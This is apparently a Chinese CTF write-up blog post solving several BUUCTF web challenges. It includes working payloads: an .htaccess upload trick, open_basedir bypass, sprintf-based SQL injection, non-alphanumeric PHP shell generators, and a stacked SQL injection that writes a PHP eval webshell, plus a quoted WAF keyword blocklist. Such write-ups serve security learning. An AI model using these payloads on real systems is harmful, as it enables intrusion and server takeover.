<p><img src="https://i.loli.net/2020/04/11/zoy7JCHTqPnrWg1.png" alt="Snipaste_2020-04-11_11-56-07.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action&#x3D;upload&amp;url&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0&amp;filename&#x3D;.htaccess</span><br></pre></td></tr></table></figure>

<p>访问</p>
<p><img src="https://i.loli.net/2020/04/11/qHtMWR6p8jnOe1S.png" alt="Snipaste_2020-04-11_11-55-10.png"></p>
<p>最后绕过<code>open_basedir和disable_function</code></p>
<p>buu的环境有点迷，POST传参的一句话报404，最后使用GET传参成功</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);var_dump(scandir(<span class="string">'/'</span>));</span><br></pre></td></tr></table></figure>

<p>预期解是爆破目录</p>
<hr>
<h4><span id="d3ctf-2019showhub">[D3CTF 2019]Showhub</span></h4><p>源码</p>
<p>定位到漏洞点    <code>Models/Model.php</code></p>
<p><img src="https://i.loli.net/2020/04/11/gJmFAZUqT57wBSM.png" alt="Snipaste_2020-04-11_12-47-56.png"></p>
<p> <code>sprintf()</code>格式化字符串漏洞。一句话概括：如果<code>%</code>后面出现一个<code>\</code>,那么php会把<code>\</code>当作一个格式化字符的类型而吃掉, 最后<code>%\</code>（或<code>%1$\</code>）被替换为空。</p>
<p>这里admin密码hash值无法反推。可以利⽤<code>ON DUPLICATE KEY UPDATE</code> ,当<code>insert</code>已经存在的记录时，执⾏<code>update</code><br>用下面的当用户名, 密码随便, 注册 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin%1$&#39;,%1$&#39;password%1$&#39;) ON DUPLICATE KEY UPDATE password&#x3D;%1$&#39;9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08%1$&#39;#</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">INSERT INTO &#96;$this-&gt;tbname&#96;(&#96;a&#96;,&#96;b&#96;) VALUE(&#39;admin&#39;,&#39;password&#39;) ON DUPLICATE KEY UPDATE password&#x3D;&#39;9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08&#39;#&#39;,&#39;sss&#39;)</span><br></pre></td></tr></table></figure>

<p>buu的题目环境没成功，</p>
<p>这时可以从服务器返回的<code>Server</code>头中发现，反代是<code>ATS7.1.2</code> 那么应该很敏感的想到通过<code>HTTP走私</code> 来绕过反代。 </p>
<blockquote>
<p><a href="https://mengsec.com/2019/10/10/http-request-smugging/" target="_blank" rel="noopener">https://mengsec.com/2019/10/10/http-request-smugging/</a> </p>
</blockquote>
<p>可以利用<strong>CL-TE</strong>的方法进行走私攻击 </p>
<hr>
<h4><span id="lfi2019">LFI2019</span></h4><p>源码</p>
<p><img src="https://i.loli.net/2020/04/11/evKJYj1qb5kD2iW.png" alt="Snipaste_2020-04-11_15-08-57.png"></p>
<p>跟进<code>get()</code></p>
<p><img src="https://i.loli.net/2020/04/11/sLuInU1eB7EyhDv.png" alt="Snipaste_2020-04-11_15-08-38.png"></p>
<p>有个奇怪的要求，即经过<code>path_sanitizer()</code>处理后的filename和原来不同，并且读取的内容也不同。</p>
<p><img src="https://i.loli.net/2020/04/11/hAkqpG5VBIcO2jQ.png" alt="Snipaste_2020-04-11_15-10-52.png"></p>
<p>最后有一次将<code>/</code>和<code>\</code>替换为空的操作，这里可以用来尝试构造出不同的文件名，但是在文件名尾试了两种都不行，无法读到文件内容。</p>
<p>这里的环境是windows。 对于Windows的文件读取，有一个小Trick：使用<code>FindFirstFile</code>这个API的时候，其会把<code>&quot;</code>解释为<code>.</code>。意即：<code>shell&quot;php</code> === <code>shell.php</code> </p>
<p>对于本题可以直接设置文件名为<code>&quot;/test</code>，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$read_file &#x3D; &quot;.&#x2F;files&#x2F;.&#x2F;test&quot;;</span><br><span class="line">$read_file_with_hardened_filter &#x3D; &quot;.&#x2F;files&#x2F;.test&quot;;</span><br><span class="line">file_get_contents($read_file) &#x3D; &#39;实际文件内容&#39;;</span><br><span class="line">file_get_contents($read_file_with_hardened_filter) &#x3D; false &#x2F;&#x2F;文件不存在</span><br></pre></td></tr></table></figure>

<p><code>put()</code>方法中对内容的过滤</p>
<p><img src="https://i.loli.net/2020/04/11/LSC4AfQJTwXE1Mp.png" alt="Snipaste_2020-04-11_15-39-31.png"></p>
<p>参考p牛的<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">无字母shell</a></p>
<p>构造一个<code>readfile(&#39;flag.php&#39;);</code></p>
<p>构造脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">"readfile"</span></span><br><span class="line">b = <span class="string">"flag.php"</span></span><br><span class="line">pos = <span class="number">2</span></span><br><span class="line">ans = <span class="string">'&lt;?=$_=[];$_="$_";$_=$_[("!"=="!")+("!"=="!")+("!"=="!")];'</span>  <span class="comment"># 得到a</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">if</span> i &gt;= <span class="string">'a'</span> <span class="keyword">and</span> i &lt;= <span class="string">'z'</span>:</span><br><span class="line">        <span class="comment"># res = '$__=$_;'</span></span><br><span class="line">        res = <span class="string">'$__=$_;'</span></span><br><span class="line">        res += (<span class="string">'$__++;'</span>) * (ord(i) - ord(<span class="string">'a'</span>))</span><br><span class="line">        pos += <span class="number">1</span></span><br><span class="line">        <span class="comment"># print(i + '=&gt;' + res)</span></span><br><span class="line">        ans += res</span><br><span class="line">        ans += <span class="string">'$___.=$__;'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ans += <span class="string">'$___.="'</span> + i + <span class="string">'";'</span></span><br><span class="line"></span><br><span class="line">print(ans)</span><br><span class="line"></span><br><span class="line">ans = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="keyword">if</span> i &gt;= <span class="string">'a'</span> <span class="keyword">and</span> i &lt;= <span class="string">'z'</span>:</span><br><span class="line">        <span class="comment"># res = '$__=$_;'</span></span><br><span class="line">        res = <span class="string">'$____=$_;'</span></span><br><span class="line">        res += (<span class="string">'$____++;'</span>) * (ord(i) - ord(<span class="string">'a'</span>))</span><br><span class="line">        pos += <span class="number">1</span></span><br><span class="line">        <span class="comment"># print(i + '=&gt;' + res)</span></span><br><span class="line">        ans += res</span><br><span class="line">        ans += <span class="string">'$_____.=$____;'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ans += <span class="string">'$_____.="'</span> + i + <span class="string">'";'</span></span><br><span class="line">ans += <span class="string">'$___($_____);?&gt;'</span></span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=$_=[];$_=<span class="string">"$_"</span>;$_=$_[(<span class="string">"!"</span>==<span class="string">"!"</span>)+(<span class="string">"!"</span>==<span class="string">"!"</span>)+(<span class="string">"!"</span>==<span class="string">"!"</span>)];$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$___.=$__;$__=$_;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$____=$_;$____++;$____++;$____++;$____++;$____++;$_____.=$____;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____.=$____;$____=$_;$_____.=$____;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$_____.=$____;$_____.=<span class="string">"."</span>;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____.=$____;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____.=$____;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____.=$____;$___($_____);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/04/11/NMqoJHZwPCL3p2d.png" alt="Snipaste_2020-04-11_17-13-20.png"></p>
<hr>
<h4><span id="suctf-2018annonymous">[SUCTF 2018]annonymous</span></h4><p>源码</p>
<p><img src="https://i.loli.net/2020/04/11/FSIxTCYn2RjfApE.png" alt="Snipaste_2020-04-11_18-53-17.png"></p>
<p><code>create_function()</code>这个函数的漏洞，他create之后会自动生成一个函数名为<code>%00lambda_%d</code></p>
<p><code>%d</code>代表是进程中的第几个匿名函数，爆破出<code>$MY</code>即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">while True:</span><br><span class="line">    r&#x3D;requests.get(&#39;http:&#x2F;&#x2F;6c2d621c-b6b5-484d-a4fe-48959d98450f.node3.buuoj.cn&#x2F;?func_name&#x3D;%00lambda_1&#39;)</span><br><span class="line">    print(r.text)</span><br></pre></td></tr></table></figure>

<h4><span id="suctf-2018getshell">[SUCTF 2018]GetShell</span></h4><p><img src="https://i.loli.net/2020/04/11/3JpKbVZC2Uku1xo.png" alt="Snipaste_2020-04-11_19-06-00.png"></p>
<p>从第六位开始检测字符，bp跑一下，只能用<code>$()[]_=;~</code></p>
<p>考点是无字母shell，p牛提供了三种思路，<code>+</code>和<code>^</code>也被过滤，还可以考虑取反</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'phpinfo'</span>;</span><br><span class="line">$b = urlencode(~$a);</span><br><span class="line">(~urldecode($b))();</span><br></pre></td></tr></table></figure>

<p>这里由于从第六位开始判断，需要使用短标签<code>&lt;?=</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>= (~(�������))();</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/04/11/fMKQO3j4luSp5bN.png" alt="Snipaste_2020-04-11_22-53-36.png"></p>
<p><code>eval()和assert()</code>失败，直接使用<code>system()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a = <span class="string">'system'</span>;</span><br><span class="line">$b = urlencode(~$a);</span><br><span class="line">$c = <span class="string">'ls /'</span>;</span><br><span class="line">$d = urlencode(~$c);</span><br><span class="line"><span class="keyword">echo</span> $b.<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $d;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/04/11/iF2SasLu4cPtzU3.png" alt="Snipaste_2020-04-11_20-29-46.png"></p>
<p>结果最后读到的是<code>SUCTF{fake_flag_web_b}</code></p>
<p>另一种方法</p>
<p>fuzz代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=utf-8'</span>);</span><br><span class="line">$str = <span class="string">'当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨，也去不走我身上任何一个毛孔里的热气。好在旅社的生活用品一应俱全，洗完澡后我爬到屋顶。旅社是一个老别墅，说起来也不算老，比起隔壁一家旧中国时期的房子要豪华得多，竖立在笔山顶上与厦门岛隔海相望。站在屋顶向下看，灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间，依稀还可以看到熙熙攘攘的游客。大概是夜晚渐深的缘故，周围慢慢变得宁静下来，我忘记白天在奔波什么，直到站在这里的时候，我才知道我寻找的答案并不在南方。当然也不在北方，北京的很多东西让我非常丧气，包括自掘坟墓的中介和颐指气使的大人们；北京也有很多东西让我喜欢，我喜欢颐和园古色古香的玉澜堂，我喜欢朝阳门那块“永延帝祚”的牌坊，喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃。但这些都不是我要的答案，我也不知道我追随的是什么，但想想百年后留下的又是什么，想想就很可怕。我曾经为了吃一碗臭豆腐，坐着优步从上地到北海北，兴冲冲地来到那个垂涎已久的豆腐摊前，用急切又害羞的口吻对老板说，来两份量的臭豆腐。其实也只要10块钱，吃完以后便是无与伦比的满足感。我记得那是毕业设计审核前夕的一个午后，五月的北京还不算炎热，和煦的阳光顺着路边老房子的屋檐洒向大地，但我还是不敢站在阳光下，春天的燥热难耐也绝不输给夏天。就像很多人冷嘲热讽的那样，做这一行谁敢把自己完全曝光，甭管你是黑帽子白帽子还是绿帽子。生活在那个时候还算美好，我依旧是一个学生，几天前辞别的同伴还在朝九晚五的工作，一切都照旧运行，波澜不远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生，甚至南下此行也不例外。一年前的这个时候我许过一个心愿，在南普陀，我特为此来还愿。理想化、单纯与恋旧，其中单纯可不是一个多么令人称赞的形容，很多人把他和傻挂钩。“你太单纯了，你还想着这一切会好起来”，对呀，在男欢女爱那些事情上，我可不单纯，但有些能让人变得圆滑与世故的抉择中，我宁愿想的更单纯一些。去年冬天孤身一人来到北京，放弃了在腾讯做一个安逸的实习生的机会，原因有很多也很难说。在腾讯短暂的实习生活让我记忆犹新，我感觉这辈子不会再像一个小孩一样被所有人宠了，这些当我选择北漂的时候应该就要想到的。北京的冬天刺骨的寒冷，特别是2015年的腊月，有几天连续下着暴雪，路上的积雪一踩半步深，咯吱咯吱响，周遭却静的像深山里的古刹。我住的小区离公司有一段距离，才下雪的那天我甚至还走着回家。北京的冬天最可怕的是寒风，走到家里耳朵已经硬邦邦好像一碰就会碎，在我一头扎进被窝里的时候，我却慢慢喜欢上这个古都了。我想到《雍正皇帝》里胤禛在北京的鹅毛大雪里放出十三爷，那个拼命十三郎带着令牌取下丰台大营的兵权，保了大清江山盛世的延续与稳固。那一夜，北京的漫天大雪绝不逊于今日，而昔人已作古，来者尚不能及，多么悲哀。这个古都承载着太多历史的厚重感，特别是下雪的季节，我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟，屋檐上的积雪，高高在上的鸱吻，想到数百年的沧桑与朝代更迭。雪停的那天我去了颐和园，我记得我等了很久才摇摇摆摆来了一辆公交车，车上几乎没有人，司机小心翼翼地转动着方向盘，在湿滑的道路上缓慢前行。窗外白茫茫一片，阳光照在雪地上有些刺眼，我才低下头。颐和园的学生票甚至比地铁票还便宜。在昆明湖畔眺望湖面，微微泛着夕阳霞光的湖水尚未结冰，踩着那些可能被御碾轧过的土地，滑了无数跤，最后只能扶着湖边的石狮子叹气，为什么没穿防滑的鞋子。昆明湖这一汪清水，见证了光绪皇帝被囚禁十载的蹉跎岁月，见证了静安先生誓为先朝而自溺，也见证了共和国以来固守与开放的交叠。说起来，家里有本卫琪著的《人间词话典评》，本想买来瞻仰一下王静安的这篇古典美学巨著，没想到全书多是以批判为主。我自诩想当文人的黑客，其实也只是嘴里说说，真到评说文章是非的时候，我却张口无词。倒是誓死不去发，这点确实让我无限感慨：中国士大夫的骨气，真的是从屈原投水的那一刻就奠定下来的。有句话说，古往今来中国三大天才死于水，其一屈原，其二李白，其三王国维。卫琪对此话颇有不服，不纠结王国维是否能够与前二者相提并论，我单喜欢他的直白，能畅快评说古今词话的人，也许无出其右了吧。人言可畏、人言可畏，越到现代越会深深感觉到这句话的正确，看到很多事情的发展往往被舆论所左右，就越羡慕那些无所畏惧的人，不论他们是勇敢还是自负。此间人王垠算一个，网络上人们对他毁誉参半，但确实有本事而又不矫揉做作，放胆直言心比天高的只有他一个了。那天在昆明湖畔看过夕阳，直到天空变的无比深邃，我才慢慢往家的方向走。耳机放着后弦的《昆明湖》，不知不觉已经十年了，不知道这时候他有没有回首望望自己的九公主和安娜，是否还能够“泼墨造一匹快马，追回十年前姑娘”。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。“大难临头，何以为之？”“世受国恩，死生系之。”'</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;mb_strlen($str, <span class="string">'utf-8'</span>); $i++)</span><br><span class="line">&#123;</span><br><span class="line">	$st = mb_substr($str, $i,<span class="number">1</span>, <span class="string">'utf-8'</span>);</span><br><span class="line">	$a = ~($st);</span><br><span class="line">	$b = $a[<span class="number">1</span>];				<span class="comment">#取汉字的第一位</span></span><br><span class="line">	<span class="keyword">if</span>($b==$_GET[<span class="string">'a'</span>])		<span class="comment">#$_GET['a']想要得到的字符</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> $st;<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">echo ~北[$____];&#x2F;&#x2F;s</span><br><span class="line">echo ~内[$____];&#x2F;&#x2F;y</span><br><span class="line">echo ~北[$____];&#x2F;&#x2F;s</span><br><span class="line">echo ~苏[$____];&#x2F;&#x2F;t</span><br><span class="line">echo ~的[$____];&#x2F;&#x2F;e</span><br><span class="line">echo ~咩[$____];&#x2F;&#x2F;m</span><br><span class="line">echo ~课[$____];&#x2F;&#x2F;P</span><br><span class="line">echo ~尬[$____];&#x2F;&#x2F;O</span><br><span class="line">echo ~笔[$____];&#x2F;&#x2F;S</span><br><span class="line">echo ~端[$____];&#x2F;&#x2F;T</span><br><span class="line">echo ~瞎[$____];&#x2F;&#x2F;a</span><br></pre></td></tr></table></figure>

<p>文件编码改成<code>ISO-8859-15</code>，写入payload保存</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=$_=[];$__.=$_;$____=$_==$_;$___=~北[$____];$___.=~内[$____];$___.=~北[$____];$___.=~苏[$____];$___.=~的[$____];$___.=~咩[$____];$_____=_;$_____.=~课[$____];$_____.=~尬[$____];$_____.=~笔[$____];$_____.=~端[$____];$__________=$$_____;$___($__________[~瞎[$____]]);</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/04/11/n6xOef7up9vEGcV.png" alt="Snipaste_2020-04-11_21-07-25.png"></p>
<hr>
<h4><span id="suctf-2018multisql">[SUCTF 2018]MultiSQL</span></h4><p>注册登录</p>
<p>构造<code>?id=2-1</code>确认存在数字型sql注入，但是根据一些payload的回显猜测存在一些替换</p>
<p><code>and</code>可以用<code>^</code>代替，但是<code>select</code>也无法使用，猜了几个字段没成功，只能尝试堆叠注入</p>
<p><code>?id=1;select 1;</code>没有出现500，存在堆叠注入</p>
<p>一开始测试时间延迟没反应有点迷</p>
<p>写shell成功</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;select &#39;&lt;?php eval($_POST[_]);?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon&#x2F;shell.php&#39;;&quot;.encode(&#39;hex&#39;))</span><br><span class="line"></span><br><span class="line">&#x3D;&gt;</span><br><span class="line"></span><br><span class="line">?id&#x3D;1;set @a &#x3D; 0x73656c65637420273c3f706870206576616c28245f504f53545b5f5d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f7368656c6c312e706870273b;prepare smtm_test from @a;execute smtm_test;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/04/11/J1s9AvfiX4Q2mrh.png" alt="Snipaste_2020-04-11_19-37-28.png"></p>
<p><code>load_file()</code>读取文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    $black_str = <span class="string">"/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&amp;])/i"</span>;</span><br><span class="line"></span><br><span class="line">    $str = preg_replace($black_str, <span class="string">"@@"</span>,$str);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> addslashes($str);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>##############</p>
<h4><span id="suctf-2018homework">[SUCTF 2018]Homework</span></h4>
            </div>
          

    
      <footer class="post-footer">

        
         <div>    
          
          <ul class="post-copyright">
             <li class="post-copyright-link">
              <strong>本文作者：</strong>
              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
            </li>

            <li class="post-copyright-license">
              <strong>版权声明： </strong>
               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
            </li>
          </ul>
        
      </div>
      
        <div class="post-tags">
          
            <a href="/tags/wp/" rel="tag"><i class="fa fa-tag"></i> wp</a>
          
        </div>
      

        
        
  <nav class="post-nav">
    
      <a class="prev" href="/2020/04/03/eyoucms%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">eyoucms历史漏洞分析</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    
    
      <a class="next" href="/2020/04/02/%E5%8D%8E%E7%A7%91cms-v1-1%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/">
        <span class="next-text nav-default">华科cms_v1.1后台sql注入+前台文件包含getshell</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>

        
  <div class="comments" id="comments">
    
      <div id="vcomments"></div>
    
  </div>


      </footer>
    
  </article>

    </div>

      </div>

      <footer id="colophon">
<span class="copyright-year">
    
        &copy;
    
    2020
    <span class="footer-author">glotozz.</span>
    <span class="power-by">
        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
    </span>
</span>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>
    



  
<!-- valine Comments -->
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
<script type="text/javascript">
    new Valine({
        el: '#vcomments',
        notify: false,
        verify: false,
        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
        placeholder: "Just go go",
        avatar: 'mm'
    });
</script>


    




  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  

    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>

    <!-- 代码块复制功能 -->
  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
  </body>
</html>
